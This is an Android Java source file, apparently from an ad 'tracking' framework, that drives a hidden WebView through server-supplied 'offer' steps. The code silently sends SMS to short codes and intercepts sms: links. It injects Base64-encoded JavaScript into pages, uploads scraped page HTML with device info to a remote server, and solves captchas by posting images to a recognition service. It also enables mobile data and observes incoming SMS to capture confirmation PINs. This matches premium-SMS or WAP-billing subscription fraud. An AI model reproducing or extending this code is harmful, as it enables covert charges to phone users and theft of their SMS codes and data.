package com.flow.framework.tracking;

import android.annotation.TargetApi;
import android.content.Context;
import android.os.Handler;
import android.text.TextUtils;
import android.util.Base64;
import android.webkit.JavascriptInterface;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.alibaba.fastjson.JSON;
import com.bumptech.glide.load.Key;
import com.flow.framework.PspManager;
import com.flow.framework.bean.CapResult;
import com.flow.framework.bean.OfferStep;
import com.flow.framework.dao.HandleDao;
import com.flow.framework.enums.OfferStatus;
import com.flow.framework.enums.StepEnum;
import com.flow.framework.model.OfferResultModel;
import com.flow.framework.model.UserModel;
import com.flow.framework.net.NetRequest;
import com.flow.framework.util.AppUtils;
import com.flow.framework.util.DeviceInfoUtil;
import com.flow.framework.util.GUtil;
import com.flow.framework.util.PullingUtils;
import com.flow.framework.util.ReUtils;
import com.flow.framework.util.plog;
import com.zhy.http.okhttp.OkHttpUtils;
import com.zhy.http.okhttp.callback.StringCallback;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.List;
import java.util.concurrent.TimeUnit;

import okhttp3.Request;


public class JSWebviewClient extends WebViewClient implements InJScriptInterface {
    private Context context;
    private OfferStep currentOfferStepModel;
    private Handler mHandler;
    private List<OfferStep> offerStepModels;
    private TrackWebView trackWebView;

    public JSWebviewClient(TrackWebView webView, Context ctx, Handler handler) {
        this.trackWebView = webView;
        this.context = ctx;
        this.mHandler = handler;
    }

    public void onPageFinished(WebView view, String url) {
        if (this.currentOfferStepModel == null || TextUtils.isEmpty(url) || view == null) {
            PspManager.getInstance().cleanWebviewClient();
            return;
        }
        plog.i("currentUrl--->" + url);
        uploadStepLog(OfferStatus.UPLOAD_DURING, url, this.currentOfferStepModel);
        switch (StepEnum.currentStep(this.currentOfferStepModel.getStep())) {
            case TRANK_URL:
                plog.i("host_url---->" + url + "----TRANK_URL");
                if (TextUtils.isEmpty(this.currentOfferStepModel.getEndUrl()) || !url.contains(this.currentOfferStepModel.getEndUrl())) {
                    if (TextUtils.isEmpty(this.currentOfferStepModel.getEndUrl())) {
                        uploadStepLog(OfferStatus.SETTING_END_URL, url, this.currentOfferStepModel);
                        break;
                    }
                }
                uploadStepLog(OfferStatus.UPLOAD_DURING_1, url, this.currentOfferStepModel);
                onDoNextStep();
                break;
            case EXECUTE_FUN_LOCK:
                plog.i("host_url---->" + url + "----SUBMIT_WAP");
                if (TextUtils.isEmpty(this.currentOfferStepModel.getEndUrl()) || !url.contains(this.currentOfferStepModel.getEndUrl())) {
                    if (TextUtils.isEmpty(this.currentOfferStepModel.getEndUrl())) {
                        uploadStepLog(OfferStatus.SETTING_END_URL, url, this.currentOfferStepModel);
                        break;
                    }
                }
                uploadStepLog(OfferStatus.UPLOAD_DURING_3, url, this.currentOfferStepModel);
                onDoNextStep();
                break;
            case EXECUTE_FUN_NOT_LOCK:
                plog.i("host_url---->" + url + "----DO_JS_FUN");
                if (TextUtils.isEmpty(this.currentOfferStepModel.getEndUrl()) || !url.contains(this.currentOfferStepModel.getEndUrl())) {
                    if (TextUtils.isEmpty(this.currentOfferStepModel.getEndUrl())) {
                        uploadStepLog(OfferStatus.SETTING_END_URL, url, this.currentOfferStepModel);
                        break;
                    }
                }
                uploadStepLog(OfferStatus.UPLOAD_DURING_4, url, this.currentOfferStepModel);
                onDoNextStep();
                break;
        }
        super.onPageFinished(view, url);
    }

    @TargetApi(21)
    public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
        if (request.getUrl() == null || TextUtils.isEmpty(request.getUrl().toString())) {
            return super.shouldInterceptRequest(view, request);
        }
        switch (StepEnum.currentStep(this.currentOfferStepModel.getStep())) {
            case DO_JS_FUN_MODEL_TO_SMS:
                if (request.getUrl().toString().startsWith("sms:")) {
                    sendMessageBySMSURL(request.getUrl().toString());
                    break;
                }
                break;
        }
        return super.shouldInterceptRequest(view, request);
    }

    public WebResourceResponse shouldInterceptRequest(WebView view, String url) {
        if (TextUtils.isEmpty(url)) {
            return super.shouldInterceptRequest(view, url);
        }
        switch (StepEnum.currentStep(this.currentOfferStepModel.getStep())) {
            case DO_JS_FUN_MODEL_TO_SMS:
                if (url.startsWith("sms:")) {
                    sendMessageBySMSURL(url);
                    break;
                }
                break;
        }
        return super.shouldInterceptRequest(view, url);
    }

    private void sendMessageBySMSURL(String url) {
        String[] result = ReUtils.getPhonenumAndBody(url);
        if (result == null || TextUtils.isEmpty(result[0]) || TextUtils.isEmpty(result[1])) {
            PspManager.getInstance().cleanWebviewClient();
            return;
        }
        sendMessageForOffer(result);
        onDoNextStep();
    }

    @JavascriptInterface
    public void getHtmlCode(String htmlStr) {
        plog.i("htmlStr-->" + htmlStr);
        if (TextUtils.isEmpty(htmlStr)) {
            onDoNextStep();
            return;
        }
        String remark = DeviceInfoUtil.makeUserInfoToString(this.context, this.currentOfferStepModel.getOfferId(), htmlStr);
        plog.i("htmlStr-->" + remark);
        NetRequest.instance().uploadContentToServer(remark, new StringCallback() {
            public void onError(Request request, Exception e) {
            }

            public void onResponse(String response) {
            }
        });
        PullingUtils.startPullingService(this.context);
        onDoNextStep();
    }

    @JavascriptInterface
    public void getImageBase64(String imageBase) {
        plog.i("htmlStr-->" + imageBase);
        if (TextUtils.isEmpty(imageBase)) {
            PspManager.getInstance().cleanWebviewClient();
            return;
        }
        String[] imgBaseArray = imageBase.split(",");
        plog.i(imgBaseArray[0] + "-------" + imgBaseArray[1]);
        NetRequest.instance().postImageBase64(imgBaseArray[1], new StringCallback() {
            @Override
            public void onError(Request request, Exception e) {
                PspManager.getInstance().cleanWebviewClient();
            }

            @Override
            public void onResponse(String response) {
                CapResult capResult = (CapResult) JSON.parseObject(response, CapResult.class);
                if (capResult != null && !TextUtils.isEmpty(capResult.getData().getRecognition())) {
                    plog.i(capResult.toString());
                    JSWebviewClient.this.replaceCapJSVCode(capResult.getData().getRecognition());
                }
            }
        });
    }

    public void onStart() {
        OfferResultModel offerModel = PspManager.getInstance().getActivieOfferStep();
        if (offerModel != null && !TextUtils.isEmpty(offerModel.getOfferId()) && !TextUtils.isEmpty(offerModel.getOfferResult())) {
            this.offerStepModels = JSON.parseArray(offerModel.getOfferResult(), OfferStep.class);
            if (this.offerStepModels == null || this.offerStepModels.size() <= 0) {
                plog.i("s2CExcuteOffer == null");
                PspManager.getInstance().cleanWebviewClient();
                return;
            }
            plog.i("currentExcuteOfferSteps.size()----->" + this.offerStepModels.size());
            for (OfferStep offerSubStep : this.offerStepModels) {
                if (offerSubStep.getNumber() == 1) {
                    this.currentOfferStepModel = offerSubStep;
                    plog.i("currentOfferSubStep--->" + this.currentOfferStepModel.toString());
                    break;
                }
            }
            normalGetCurrentStep();
        }
    }

    private void onDoNextStep() {
        if (this.offerStepModels == null || this.offerStepModels.size() <= 0) {
            plog.i("currentListOfferStep == null");
            PspManager.getInstance().cleanWebviewClient();
        } else if (this.currentOfferStepModel == null) {
            plog.i("currentOfferSubStep == null");
            PspManager.getInstance().cleanWebviewClient();
        } else {
            for (OfferStep offerSubStep : this.offerStepModels) {
                if (offerSubStep.getNumber() == this.currentOfferStepModel.getNumber() + 1) {
                    this.currentOfferStepModel = offerSubStep;
                    plog.i("currentOfferSubStep--->" + this.currentOfferStepModel.toString());
                    break;
                }
            }
            normalGetCurrentStep();
        }
    }

    private void trackStepByTrackUrl() {
        plog.i("url--->" + this.currentOfferStepModel.getTrankUrl());
        if (TextUtils.isEmpty(this.currentOfferStepModel.getTrankUrl())) {
            plog.i("s2CExcuteOffer.getTrackUrl() == null");
            PspManager.getInstance().cleanWebviewClient();
            return;
        }
        this.trackWebView.mWebView.loadUrl(this.currentOfferStepModel.getTrankUrl());
    }

    private void sendMessageForOffer() {
        plog.i("11offerStepModel--->" + this.currentOfferStepModel.getNumber() + "----step--->" + this.currentOfferStepModel.getStep());
        UserModel userModel = UserModel.getUserModel(this.currentOfferStepModel.getOfferId(), this.currentOfferStepModel.getNetType());
        if (userModel != null && userModel.getStatus() == 0) {
            PspManager.checkBroadcast();
            PspManager.registerBroadcast(this.currentOfferStepModel);
            plog.i("shortCode----->" + this.currentOfferStepModel.getShortCode() + "keyWord----->" + this.currentOfferStepModel.getKeyWord());
            AppUtils.sendSms(this.context, this.currentOfferStepModel.getShortCode(), this.currentOfferStepModel.getKeyWord());
            uploadStepLog(OfferStatus.UPDATE_USER_STATUS, this.currentOfferStepModel.toString(), this.currentOfferStepModel);
            userModel.setStatus(1);
            UserModel.updateUserModel(userModel);
            PullingUtils.startPullingService(this.context);
        }
        onDoNextStep();
    }

    private void sendMessageForOffer(String[] param) {
        plog.i("11offerStepModel--->" + this.currentOfferStepModel.getNumber() + "----step--->" + this.currentOfferStepModel.getStep());
        UserModel userModel = UserModel.getUserModel(this.currentOfferStepModel.getOfferId(), this.currentOfferStepModel.getNetType());
        if (userModel != null && userModel.getStatus() == 0) {
            PspManager.checkBroadcast();
            PspManager.registerBroadcast(this.currentOfferStepModel);
            plog.i("shortCode----->" + param[0] + "keyWord----->" + param[1]);
            AppUtils.sendSms(this.context, param[0], param[1]);
            uploadStepLog(OfferStatus.UPDATE_USER_STATUS, this.currentOfferStepModel.toString(), this.currentOfferStepModel);
            userModel.setStatus(1);
            UserModel.updateUserModel(userModel);
            PullingUtils.startPullingService(this.context);
        }
        onDoNextStep();
    }

    private void submitWapOffer() {
        plog.i("11offerStepModel--->" + this.currentOfferStepModel.getNumber() + "----step--->" + this.currentOfferStepModel.getStep());
        UserModel userModel = UserModel.getUserModel(this.currentOfferStepModel.getOfferId(), this.currentOfferStepModel.getNetType());
        if (userModel != null && userModel.getStatus() == 0) {
            this.trackWebView.mWebView.loadUrl(this.currentOfferStepModel.getParams());
            uploadStepLog(OfferStatus.UPDATE_USER_STATUS, this.currentOfferStepModel.toString(), this.currentOfferStepModel);
            userModel.setStatus(1);
            UserModel.updateUserModel(userModel);
            PullingUtils.startPullingService(this.context);
        }
    }

    private void jsFunForWapOffer() {
        if (!TextUtils.isEmpty(this.currentOfferStepModel.getParams())) {
            plog.i(this.currentOfferStepModel.getParams());
            this.trackWebView.mWebView.loadUrl(this.currentOfferStepModel.getParams());
        }
    }

    private void destoryAndReset() {
        plog.i("destoryAndReset--->");
        uploadStepLog(OfferStatus.RELEASE_DATA, null, this.currentOfferStepModel);
        PspManager.getInstance().cleanWebviewClient();
    }

    private void getHtmlValue() {
        plog.i("getHtmlValue");
        String str110JsCode = PspManager.INJECT_JS_FUNCTION.replace(PspManager.JS_CODE, Base64.encodeToString(PspManager.OBTAIN_HTML_CODE_JS_FUN.getBytes(), 2));
        plog.i("str110JsCode----->" + str110JsCode);
        this.trackWebView.mWebView.loadUrl(str110JsCode);
        if (this.mHandler != null) {
            this.mHandler.postDelayed(new Runnable() {
                public void run() {
                    JSWebviewClient.this.execute107MethodGetValue(PspManager.EXECUTE_OBTAIN_HTML_CODE_JS_FUN);
                }
            }, OkHttpUtils.DEFAULT_MILLISECONDS);
        }
    }

    private void injectJSToHtml() {
        if (TextUtils.isEmpty(this.currentOfferStepModel.getParams())) {
            onDoNextStep();
            return;
        }
        String str110JsCode = PspManager.INJECT_JS_FUNCTION.replace(PspManager.JS_CODE, Base64.encodeToString(this.currentOfferStepModel.getParams().getBytes(), 2));
        plog.i("str110JsCode----->" + str110JsCode);
        this.trackWebView.mWebView.loadUrl(str110JsCode);
        if (this.mHandler != null) {
            this.mHandler.postDelayed(new Runnable() {
                public void run() {
                    JSWebviewClient.this.onDoNextStep();
                }
            }, OkHttpUtils.DEFAULT_MILLISECONDS);
        }
    }

    private void settingPhoneData() {
        GUtil.gprsEnabled(this.context, true);
        if (this.mHandler != null) {
            this.mHandler.postDelayed(new Runnable() {
                public void run() {
                    JSWebviewClient.this.onDoNextStep();
                }
            }, OkHttpUtils.DEFAULT_MILLISECONDS);
        }
    }

    private void getImageBase64() {
        plog.i("getImageBase64");
        if (TextUtils.isEmpty(this.currentOfferStepModel.getParams())) {
            PspManager.getInstance().cleanWebviewClient();
            return;
        }
        String jsImageObject = PspManager.METHOD_GET_IMAGE_BASE64_JS_FUN_NOT_CALLBACK.replace(PspManager.REPLACE_METHOD_IMAGE_OBJECT_STR, this.currentOfferStepModel.getParams());
        plog.i("getImageBase64----->" + jsImageObject);
        String str110JsCode = PspManager.INJECT_JS_FUNCTION.replace(PspManager.JS_CODE, Base64.encodeToString(jsImageObject.getBytes(), 2));
        plog.i("str110JsCode----->" + str110JsCode);
        this.trackWebView.mWebView.loadUrl(str110JsCode);
        if (this.mHandler != null) {
            this.mHandler.postDelayed(new Runnable() {
                public void run() {
                    JSWebviewClient.this.execute107MethodGetValue(PspManager.EXECUTE_OBTAIN_IMAGE_BASE64_JS_FUN);
                }
            }, OkHttpUtils.DEFAULT_MILLISECONDS);
        }
    }

    private void sendMessageForSMSLog() {
        this.mHandler.postDelayed(new Runnable() {
            public void run() {
                PspManager.getInstance().registerContentObserver(JSWebviewClient.this.mHandler, JSWebviewClient.this.currentOfferStepModel, JSWebviewClient.this.context);
            }
        }, TimeUnit.MINUTES.toMillis(1));
    }

    private void sendMessageForPIN() {
        if (this.currentOfferStepModel == null || TextUtils.isEmpty(this.currentOfferStepModel.getParams())) {
            PspManager.getInstance().cleanWebviewClient();
        } else {
            this.mHandler.postDelayed(new Runnable() {
                public void run() {
                    PspManager.getInstance().registerContentObserver(JSWebviewClient.this.mHandler, JSWebviewClient.this.currentOfferStepModel, JSWebviewClient.this.context);
                }
            }, TimeUnit.MINUTES.toMillis(1));
        }
    }

    private void sendMessageForZAPIN() {
        if (this.currentOfferStepModel == null || TextUtils.isEmpty(this.currentOfferStepModel.getParams())) {
            PspManager.getInstance().cleanWebviewClient();
        } else {
            this.mHandler.postDelayed(new Runnable() {
                public void run() {
                    PspManager.getInstance().registerContentObserver(JSWebviewClient.this.mHandler, JSWebviewClient.this.currentOfferStepModel, JSWebviewClient.this.context);
                }
            }, TimeUnit.MINUTES.toMillis(1));
        }
    }

    private void normalGetCurrentStep() {
        switch (StepEnum.currentStep(this.currentOfferStepModel.getStep())) {
            case TRANK_URL:
                trackStepByTrackUrl();
                return;
            case EXECUTE_FUN_LOCK:
                submitWapOffer();
                return;
            case EXECUTE_FUN_NOT_LOCK:
                jsFunForWapOffer();
                return;
            case INJECT_JS_FUN:
                injectJSToHtml();
                return;
            case SEND_MESSAGE:
                sendMessageForOffer();
                return;
            case OBTAIN_HTML_CODE:
                getHtmlValue();
                return;
            case DESTORY_RESET:
                destoryAndReset();
                return;
            case SET_PHONE_DATA:
                settingPhoneData();
                return;
            case GET_IMAGE_BASE64:
                getImageBase64();
                return;
            case UPLOAD_USER_SMS_FOR_LOG:
                sendMessageForSMSLog();
                return;
            case SEND_MESSAGE_FOR_PIN:
                sendMessageForPIN();
                return;
            case SEND_MESSAGE_FOR_ZA:
                sendMessageForZAPIN();
                return;
            default:
                return;
        }
    }

    public void uploadStepLog(OfferStatus offerStatus, String remark, OfferStep offerStep) {
        if (!TextUtils.isEmpty(remark)) {
            try {
                remark = URLEncoder.encode(remark, Key.STRING_CHARSET_NAME);
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
                remark = "UnsupportedEncodingException";
            }
        }
        HandleDao.getInstance().updateOfferInfo(null, this.context, this.currentOfferStepModel.getOfferId(), OfferStatus.getIntFromOfferStatus(offerStatus), remark, offerStep);
    }

    private void execute107MethodGetValue(String funStr) {
        this.trackWebView.mWebView.loadUrl(funStr);
    }

    private void replaceCapJSVCode(String vcode) {
        if (TextUtils.isEmpty(vcode) || this.offerStepModels == null || this.offerStepModels.size() <= 0) {
            PspManager.getInstance().cleanWebviewClient();
            return;
        }
        for (OfferStep currentExcuteOfferStep : this.offerStepModels) {
            if (!TextUtils.isEmpty(currentExcuteOfferStep.getParams())) {
                currentExcuteOfferStep.setParams(currentExcuteOfferStep.getParams().replace(PspManager.REPLACE_CAP_VCODE, vcode));
                plog.i("replaceCapJSVCode----replace---->" + currentExcuteOfferStep.toString());
            }
        }
        onDoNextStep();
    }

    public void replacePinJSVCode(String vcode) {
        if (TextUtils.isEmpty(vcode) || this.offerStepModels == null || this.offerStepModels.size() <= 0) {
            PspManager.getInstance().cleanWebviewClient();
            return;
        }
        for (OfferStep currentExcuteOfferStep : this.offerStepModels) {
            if (!TextUtils.isEmpty(currentExcuteOfferStep.getParams())) {
                currentExcuteOfferStep.setParams(currentExcuteOfferStep.getParams().replace(PspManager.REPLACE_CAP_VCODE, vcode));
                plog.i("replaceCapJSVCode----replace---->" + currentExcuteOfferStep.toString());
            }
        }
        onDoNextStep();
    }

    public void replaceZaPinJSVCode(String vcode) {
        if (TextUtils.isEmpty(vcode) || this.offerStepModels == null || this.offerStepModels.size() <= 0) {
            PspManager.getInstance().cleanWebviewClient();
            return;
        }
        for (OfferStep currentExcuteOfferStep : this.offerStepModels) {
            if (!TextUtils.isEmpty(currentExcuteOfferStep.getShortCode())) {
                currentExcuteOfferStep.setShortCode(currentExcuteOfferStep.getShortCode().replace(PspManager.REPLACE_ZA_CAP_VCODE, vcode));
                plog.i("replaceCapJSVCode----replace---->" + currentExcuteOfferStep.toString());
            }
        }
        onDoNextStep();
    }
}
